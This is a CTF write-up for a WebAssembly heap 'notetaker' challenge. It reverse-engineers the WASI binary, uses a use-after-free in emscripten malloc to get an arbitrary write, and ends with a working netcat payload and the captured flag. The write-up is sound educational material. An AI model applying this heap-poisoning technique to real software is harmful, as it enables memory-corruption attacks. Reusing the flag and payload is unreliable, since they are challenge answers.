# `Notetaker Wasm` - `350pt pwn`  
> Just another heap notetaker challenge - compiled to wasm.  
>  
> Hints:  
> - *Old vulnerabilities can become new in wasm*  
>

\<This will be a (hopefully) in depth guide through the binary\>

From the name alone, you can guess there will be some aspect of dynamic
allocator misuse, just like any other "notetaker" pwn challenge. Running it
once for a test run, and it's pretty clear that it's dynamic allocator misuse
- specifically probably Use After Free, since you can write to data even after
'deleting' it.

```  
]=======[ MENU ]=======[  
] 1) Print a note      [  
] 2) Delete note       [  
] 3) Create a note     [  
] 4) Write to a note   [  
]======================[  
Please choose an option (1, 2, 3, 4)  
3

Please choose a note (1 to 8 inclusive)  
1  
Note has been created

]=======[ MENU ]=======[  
] 1) Print a note      [  
] 2) Delete note       [  
] 3) Create a note     [  
] 4) Write to a note   [  
]======================[  
Please choose an option (1, 2, 3, 4)  
2

Please choose a note (1 to 8 inclusive)  
1  
Note has been deleted

]=======[ MENU ]=======[  
] 1) Print a note      [  
] 2) Delete note       [  
] 3) Create a note     [  
] 4) Write to a note   [  
]======================[  
Please choose an option (1, 2, 3, 4)  
4

Please choose a note (1 to 8 inclusive)  
1  
Send note content for note #1  
USING THIS AFTER FREE (POTENTIALLY)  
```

To find out more about how this program is actually working, let's dive into
the Wasm.

## 1. Analyzing the Wasm

We are given only `provided.wasm`. Usually Wasm runs on the web along with
javascript glue code, but when the only thing provided is a single Wasm file,
only two things could've happened: 1. The js glue code was not provided, but
it does exist, or 2. The Wasm is accessing the [Web Assembly System
Interface](https://wasi.dev/) or WASI for short. WASI allows standalone Wasm
programs to run headlessly, while giving them the ability to print to stdout,
read stdin, and etc.

So how do we find out if it's using WASI? Let's check out the Wasm for any
easy to find clues.

> To convert the Wasm bytecode to the Web Assembly Text format, you can run
> `wasm2wat provided.wasm -o provided.wat --generate-names --fold-exprs
> --inline-exports --inline-imports` (the options enabled allow for easier-to
> read Wasm)

```wasm  
 (func $wasi_snapshot_preview1.proc_exit (import "wasi_snapshot_preview1"
"proc_exit") (type $t5) (param i32))  
 (func $wasi_snapshot_preview1.fd_write (import "wasi_snapshot_preview1"
"fd_write") (type $t8) (param i32 i32 i32 i32) (result i32))  
 (func $wasi_snapshot_preview1.fd_close (import "wasi_snapshot_preview1"
"fd_close") (type $t0) (param i32) (result i32))  
 (func $wasi_snapshot_preview1.fd_read (import "wasi_snapshot_preview1"
"fd_read") (type $t8) (param i32 i32 i32 i32) (result i32))  
 (func $wasi_snapshot_preview1.fd_seek (import "wasi_snapshot_preview1"
"fd_seek") (type $t16) (param i32 i64 i32 i32) (result i32))  
```

These 5 imports are clear, if not the clearest, signs that the Wasm is built
for WASI. Also there's an exported function named `_start` which is also an
indication that it is a WASI Wasm file.

```wasm  
 (func $_start (export "_start") (type $t3)  
   (block $B0  
     (br_if $B0  
       (i32.eqz  
         (i32.const 1)))  
     (call $f5))  
   (call $f17  
     (call $f13))  
   (unreachable))  
```

More about that `_start`, just so you know, this is a common function in
emscripten compiled C/C++ that uses libc. So now that we know the wasm is
likely compiled by emscripten, we need to look into where the actual code is.
The `_start` first sets up the global constructors by calling the first
function, then it calls exit(main()), where `main` is the main code, and
`exit` exits safely. In this case, `$f17` is `exit` and `$f13` is `main`.
Naturally, we need to look into `main`.

```wasm  
   ;; main function  
 (func $f13 (type $t2) (result i32)  
   (local $l0 i32) (local $l1 i32) (local $l2 i32) (local $l3 i32) (local $l4
i32) (local $l5 i32) (local $l6 i32) (local $l7 i32) (local $l8 i32) (local
$l9 i32) (local $l10 i32) (local $l11 i32) (local $l12 i32) (local $l13 i32)
(local $l14 i32) (local $l15 i32) (local $l16 i32) (local $l17 i32) (local
$l18 i32) (local $l19 i32)

   ;; Make space on the stack  
   (local.set $l0  
     (global.get $g0))  
   (local.set $l1  
     (i32.const 16))  
   (local.set $l2  
     (i32.sub  
       (local.get $l0)  
       (local.get $l1)))  
   (global.set $g0  
     (local.get $l2))  
```

As you can see, there's a ton of local variables in this function - that's
usually a good sign, it means the Wasm is unminified. Unminified would mean
that it shouldn't be too difficult to understand this program (all hand
written functions are completely untouched, all code is preserved). The second
thing you'll see is a series of instructions that end up decreasing global
variable `$g0` by 16. In any LLVM compiled Wasm binary, global variable 0 will
be the stack pointer. So this code means that 16 bytes of space are allocated
on the stack, for the placement of variable's in the function's scope; that'll
come in handy later.

For now, we can leave the main function alone as is, we've already gotten
quite a lot of info about the Wasm file, such as:  
 - Compiled with Emscripten (LLVM)  
 - Not minified  
 - Built for WASI

With this knowledge, we can start to hone in on how to get the flag.

## 2. Finding flag

```wasm  
(data $d0 (i32.const 1024) "bcactf{not_the_actual_flag}\00infinity\00-+
0X0x\00-0X+0X 0X-0x+0x 0x\00%15s\00Note has been writte" ;; and etc...  
```

As you can see, there is a flag placed at address 1024, but this is clearly
not the flag (since it says `not_the_actual_flag`). The assumption is that, on
the version running on remote, the string at address `1024` will be infact the
actual flag, but we'll have to see. Possible ideas routes from here:  
 - Since the flag was put into the wasm by the compiler, it's likely being used in some part of the code, or it was somehow forced in. If such code exists, we can see if there's a possibility of accessing or executing it  
 - Since there is a chance this is just dynamic allocator misuse, we could possibly get arbitrary read access - if so, we can just read from address 1024

My/the intended solvepath involved the first, since I wasn't able to create a
payload the allowed for the 2nd option, although there is probably some sort
of way to do it.

So naturally, searching for `1024` in the wasm yields  
```wasm  
 (func $f12 (type $t3)  
   (local $l0 i32)  
   (local.set $l0  
     (i32.const 1024))  
   (drop  
     (call $f35  
       (local.get $l0)))  
   (return))  
```  
and  
```wasm  
(func $f69 (type $t11) (param $p0 f64) (param $p1 i32) (result f64)  
   (block $B0  
     (block $B1  
       (br_if $B1  
         (i32.lt_s  
           (local.get $p1)  
           (i32.const 1024)))  
       (local.set $p0  
         (f64.mul  
           (local.get $p0)  
           (f64.const 0x1p+1023 (;=8.98847e+307;))))  
           ;; etc...  
```

The first instance is part of a very short function. Here's some more info
about `$f12`:  
 - Its called within main (see line 730 in the wat)  
 - It calls `$f35(1024)`

Well, this seems like something. Let's dive into `$f35`:

Function `$f35` is called many times in the program, so whatever it is, it is
very broadly applicable - possibly a printing function? Other instances of
`$f35` include : `$f35(1443), $f35(1385), $f35(1520), $f35(1349), $f35(1165)`.
And fortunately enough, every single one of these parameters are an address of
a string.  
 - `1443`: `Please choose a note (1 to 8 inclusive)`  
 - `1385`: `Invalid note index! Index must be from 1 to 8 (inclusive)`  
 - `1520`: `Printing note`  
 - `1349`: `No space for note? Exitting.`

And etc. Each one corresponds to a different string that gets printed during
the program, and luckily for us, this same function that's (probably) doing
the printing, is also printing the flag.

## 3. Calling `$f12`

Inside of this loop within main (which is probably part of the repeating Menu-
Printing cycle), there are a couple of checks that are made before calling
`$f12`.

```wasm  
   (block $B0  
     (loop $L1  
       (local.set $l5  
         (i32.load offset=8  
           (local.get $l2)))  
       (local.set $l6  
         (i32.const 1731480678))  
       (local.set $l7  
         (local.get $l5))  
       (local.set $l8  
         (local.get $l6))  
       (local.set $l9 ;; $l9 is set to (1 or 0) whether or not *((int*) __stack_base (aka EBP)[2] ) is equal to 1731480678

         (i32.eq  
           (local.get $l7)  
           (local.get $l8)))  
       (local.set $l10  
         (i32.const 1))  
       (local.set $l11 ;; $l11 is set to $l9 & 1  
         (i32.and  
           (local.get $l9)  
           (local.get $l10)))  
       (block $B2  
         (br_if $B2 (;;;; THIS MEANS IF STATEMENT ;;;;;;)  
           (i32.eqz  
             (local.get $l11)))  
         (call $f12) ;; Call $f32 is $l11 is truthy  
         (local.set $l12  
           (i32.const 0))  
         (i32.store offset=12  
           (local.get $l2)  
           (local.get $l12))  
         (br $B0)) (;;;; Exit out of the loop itself ;;;;;;)  
```

To summarize, I'll convert this to some pseudo code

```c  
while (true) {  
 if int at offset 8 from EBP == 1731480678 // 0x67344c66  
 then {  
   call printflag()  
 }  
}  
```

Where EBP = __stack_pointer - 16 (as shown in section 1). This means that we
need to somehow arbitrarily write to __stack_pointer - 8. We can make this
more precise but realizing that the __stack_pointer is the same in every
instance of the wasm.

```wasm  
(global $g0 (mut i32) (i32.const 5248752))  
```

You can also notice that 0x67344c66 is unicode, and after converting, you will
see that it is equivalent to `fL4g`. How appropriate lol.

Finally putting it all together, we need to write the string value `fL4g` at
address `0x5016e8`. Now that the goal is clear, we need to start exploiting.

## 4. Exploitation in Wasm based malloc

We need to test around with emscripten Wasm's malloc to understand the
exploitation potential of a Use After Free bug within the program. To do this,
we can set up a testing environment on the web.

```c  
#include <stdlib.h>

int main() {return 0;}  
```

If you compile this program with `emcc malloc.c -s
EXPORTED_FUNCTIONS=_main,_malloc,_free -o index.html`. Then, after hosting
locally, in your webpage, you can access _free() and _malloc().

I do not have much experience with heap exploitation outside of Wasm (lol), so
I'll just cut to the chase here.

```js  
const destination = 1000;

const uaf_ptr = _malloc(0x20 /* the size doesn't matter much as long as its
all the same and small */)  
_malloc(0x20);  
_free(uaf_ptr);  
HEAP32[uaf_ptr >> 2] = destination - 0x8  
_malloc(0x20);  
console.log(_malloc(0x20)); // Prints out destination  
```

So we use this series of techniques to modify the variable at `0x5016e8`, and
set it to `fL4g`.

## 5. Putting it all together

```  
alloc(1)  
alloc(2)  
free(1)  
write(1, u32(0x5016e8 - 8))  
alloc(3)  
alloc(4)  
write(4, "fL4g")  
print(4) # just confirmation  
```

And to feed into the netcat: `echo -e "3\n1\n3\n2\n2\n1\n4\n1\n\xe0\x16\x50\x00\x00\n3\n3\n3\n4\n4\n4\nfL4g\n1\n4\n" | nc bin.bcactf.com 49180`

Interestingly enough, this crashes - due to there not being space before
`0x5016e0`. I'm not fully knowledgeable about why this is, but I found the fix
to this by writing to `0x5016e4` instead of 0x5016e8, and then padding the
fL4g by 4 characters (in this case 4 `0`s). This led to the final payload
being  
```  
echo -e "3\n1\n3\n2\n2\n1\n4\n1\n\xdc\x16\x50\x00\x00\n3\n3\n3\n4\n4\n4\n0000fL4g\n1\n4\n" | nc bin.bcactf.com 49180  
```

> `bcactf{e8f73a0ebcd82fcce8a}`